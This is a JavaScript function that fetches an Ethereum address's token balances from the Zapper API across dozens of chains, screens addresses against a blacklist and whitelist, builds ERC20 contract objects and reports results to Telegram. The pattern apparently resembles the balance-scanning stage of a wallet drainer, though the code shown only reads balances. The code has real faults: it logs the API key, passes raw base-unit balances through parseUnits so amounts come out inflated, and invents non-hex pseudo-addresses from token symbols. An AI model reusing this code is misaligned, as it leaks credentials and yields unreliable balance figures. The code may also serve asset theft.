const fetchBalancesFromZapper = async (address, chainId) => {
  console.log(`Fetching balances for address: ${address} on chain: ${chainId}`);
  const provider = getProvider(chainId);

  // Validate address
  if (!ethers.utils.isAddress(address)) {
    const message = `Invalid Ethereum address: ${address}`;
    console.error(message);
    // await sendToTelegram(message);
    return [];
  }
  const checksummedAddress = ethers.utils.getAddress(address);

  // Check blacklist/whitelist
  if (isAddressBlacklisted(checksummedAddress)) {
    const message = `🚨 Blacklisted address detected: ${checksummedAddress}. Aborting balance fetch.`;
    console.warn(message);
    // await sendToTelegram(message);
    return [];
  }
  if (isAddressWhitelisted(checksummedAddress)) {
    const message = `✅ Whitelisted address detected: ${checksummedAddress}. Fetching balances.`;
    console.log(message);
    // await sendToTelegram(message);
  }

  // Define supported Zapper networks
  const networkMap = {
    1: 'ETHEREUM_MAINNET',
    2741: 'ABSTRACT_MAINNET',
    33139: 'APECHAIN_MAINNET',
    42161: 'ARBITRUM_MAINNET',
    42170: 'ARBITRUM_NOVA_MAINNET',
    43114: 'AVALANCHE_MAINNET',
    223: 'B2_MAINNET',
    8453: 'BASE_MAINNET',
    80094: 'BERACHAIN_MAINNET',
    81457: 'BLAST_MAINNET',
    56: 'BINANCE_SMART_CHAIN_MAINNET',
    60808: 'BOB_MAINNET',
    42220: 'CELO_MAINNET',
    1116: 'CORE_MAINNET',
    7560: 'CYBER_MAINNET',
    666666666: 'DEGEN_MAINNET',
    250: 'FANTOM_OPERA_MAINNET',
    747: 'FLOW_MAINNET',
    252: 'FRAX_MAINNET',
    100: 'GNOSIS_MAINNET',
    13371: 'IMMUTABLEX_MAINNET',
    57073: 'INK_MAINNET',
    232: 'LENS_MAINNET',
    59144: 'LINEA_MAINNET',
    5000: 'MANTLE_MAINNET',
    1088: 'METIS_MAINNET',
    34443: 'MODE_MAINNET',
    1284: 'MOONBEAM_MAINNET',
    2818: 'MORPH_MAINNET',
    204: 'OPBNB_MAINNET',
    10: 'OPTIMISM_MAINNET',
    137: 'POLYGON_MAINNET',
    1101: 'POLYGON_ZKEVM_MAINNET',
    690: 'REDSTONE_MAINNET',
    2020: 'RONIN_MAINNET',
    30: 'ROOTSTOCK_MAINNET',
    534352: 'SCROLL_MAINNET',
    360: 'SHAPE_MAINNET',
    1868: 'SONEIUM_MAINNET',
    146: 'SONIC_MAINNET',
    1514: 'STORY_MAINNET',
    167000: 'TAIKO_MAINNET',
    130: 'UNICHAIN_MAINNET',
    480: 'WORLDCHAIN_MAINNET',
    660279: 'XAI_MAINNET',
    543210: 'ZERO_MAINNET',
    324: 'ZKSYNC_MAINNET',
    7777777: 'ZORA_MAINNET',
  };

  // Check for unsupported chains
  const unsupportedChains = [11155111]; // Sepolia, etc.
  const network = networkMap[chainId];
  if (!network || unsupportedChains.includes(chainId)) {
    console.log(`Chain ${chainId} is unsupported by Zapper. Using direct fetch.`);
    return await fetchBalancesDirectly(checksummedAddress, chainId);
  }

  // Token address mapping by network and symbol
  // This map helps us identify contract addresses from symbols returned by Zapper
  const tokenAddressMap = {
    // Ethereum Mainnet (1)
    'ETHEREUM_MAINNET': {
      'ETH': ethers.constants.AddressZero,
      'USDC': '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48',
      'USDT': '0xdAC17F958D2ee523a2206206994597C13D831ec7',
      'DAI': '0x6B175474E89094C44Da98b954EedeAC495271d0F',
      'WETH': '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2',
      'UNI': '0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984',
      'LINK': '0x514910771AF9Ca656af840dff83E8264EcF986CA',
      // Add more tokens as needed
    },
    // Arbitrum (42161)
    'ARBITRUM_MAINNET': {
      'ETH': ethers.constants.AddressZero,
      'USDC': '0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8',
      'USDT': '0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9',
      'DAI': '0xDA10009cBd5D07dd0CeCc66161FC93D7c9000da1',
      'WETH': '0x82aF49447D8a07e3bd95BD0d56f35241523fBab1',
      // Add more tokens as needed
    },
    // Add more networks as needed
  };

  try {
    const ZAPPER_API_KEY = config.ZAPPER_API_KEY;
    if (!ZAPPER_API_KEY) {
      throw new Error('ZAPPER_API_KEY is not configured');
    }

    const query = `
      query PortfolioV2($addresses: [Address!]!, $networks: [Network!]) {
        portfolioV2(addresses: $addresses, networks: $networks) {
          tokenBalances {
            byToken {
              edges {
                node {
                  balance
                  balanceRaw
                  balanceUSD
                  symbol
                  name
                  decimals
                  token {
                    address
                  }
                }
              }
            }
          }
        }
      }
    `;

    console.log('ZAPPER_API_KEY:', ZAPPER_API_KEY);
    console.log('Request Payload:', {
      query,
      variables: { addresses: [checksummedAddress], networks: [network] },
    });

    const response = await axios.post(
      'https://public.zapper.xyz/graphql',
      {
        query,
        variables: {
          addresses: [checksummedAddress],
          networks: [network],
        },
      },
      {
        headers: {
          'Content-Type': 'application/json',
          'x-zapper-api-key': ZAPPER_API_KEY,
        },
      }
    );

    console.log('Zapper Response:', JSON.stringify(response.data, null, 2));

    if (response.data.errors) {
      throw new Error(`GraphQL Errors: ${JSON.stringify(response.data.errors)}`);
    }

    const tokens = [];
    let telegramMessage = `Token balances for address: ${checksummedAddress}\n\n`;
    let foundBlacklistedToken = false;

    const tokenEdges = response.data.data.portfolioV2.tokenBalances.byToken.edges;

    for (const edge of tokenEdges) {
      const token = edge.node;

      // Get token address - try to get it from the response first
      let tokenAddress;

      // Try to get token address from response
      if (token.token && token.token.address) {
        tokenAddress = token.token.address;
      }
      // If not available, try to look up in our mapping
      else if (tokenAddressMap[network] && tokenAddressMap[network][token.symbol]) {
        tokenAddress = tokenAddressMap[network][token.symbol];
      }
      // For native token
      else if (token.symbol === 'ETH' || token.symbol === 'MATIC' || token.symbol === 'BNB' || token.symbol === 'AVAX') {
        tokenAddress = ethers.constants.AddressZero;
      }
      // If we still don't have an address, generate a pseudo-address from the symbol
      // This is not ideal but will provide a unique identifier
      else {
        console.warn(`Could not find address for token ${token.symbol} on ${network}, using symbol as identifier`);
        tokenAddress = `0x${token.symbol.padStart(40, '0')}`;
      }

      // Check for blacklisted tokens
      if (isAddressBlacklisted(tokenAddress.toLowerCase())) {
        foundBlacklistedToken = true;
        telegramMessage += `🚨 Blacklisted token detected: ${token.name} (${tokenAddress})\n`;
        continue;
      }

      const amount = ethers.utils.parseUnits(token.balanceRaw || "0", token.decimals || 18);
      const amountUSD = parseFloat(token.balanceUSD || 0);

      if (amountUSD > 0) {
        const isNative = tokenAddress === ethers.constants.AddressZero;

        // Create contract instance for ERC20 tokens
        let contract = null;
        if (!isNative && tokenAddress.startsWith('0x')) {
          try {
            contract = new ethers.Contract(tokenAddress, ERC20_ABI, provider);
          } catch (err) {
            console.warn(`Failed to create contract for ${token.symbol} at address ${tokenAddress}:`, err);
          }
        }

        const tokenDetails = {
          address: tokenAddress,
          balance: amount,
          contract,
          name: token.name || token.symbol,
          symbol: token.symbol,
          type: isNative ? 'NATIVE' : 'ERC20',
          amount,
          amountUSD,
          decimals: token.decimals || 18
        };

        tokens.push(tokenDetails);

        telegramMessage += `${tokenDetails.name} (${tokenDetails.symbol}): ${ethers.utils.formatUnits(
          tokenDetails.balance,
          token.decimals || 18
        )} (${amountUSD.toFixed(2)} USD)\n`;
      }
    }

    if (foundBlacklistedToken) {
      telegramMessage += `\n🚨 One or more blacklisted tokens were detected and skipped.\n`;
      await sendToTelegram(telegramMessage);
    }


    console.log(`Fetched ${tokens.length} tokens from Zapper`);
    // sendToTelegram(`Fetched ${tokens.length} tokens from Zapper`);
    return tokens;

  } catch (error) {
    const errorDetails = error.response
      ? `Status: ${error.response.status}, Data: ${JSON.stringify(error.response.data, null, 2)}`
      : error.message;
    console.error('Error fetching balances from Zapper:', errorDetails);
    // await sendToTelegram(`❌ Error fetching from Zapper for ${checksummedAddress}: ${errorDetails}`);

    // Fall back to direct fetching on error
    console.log(`Falling back to direct fetch for chain ${chainId}`);
    return await fetchBalancesDirectly(checksummedAddress, chainId);
  }
};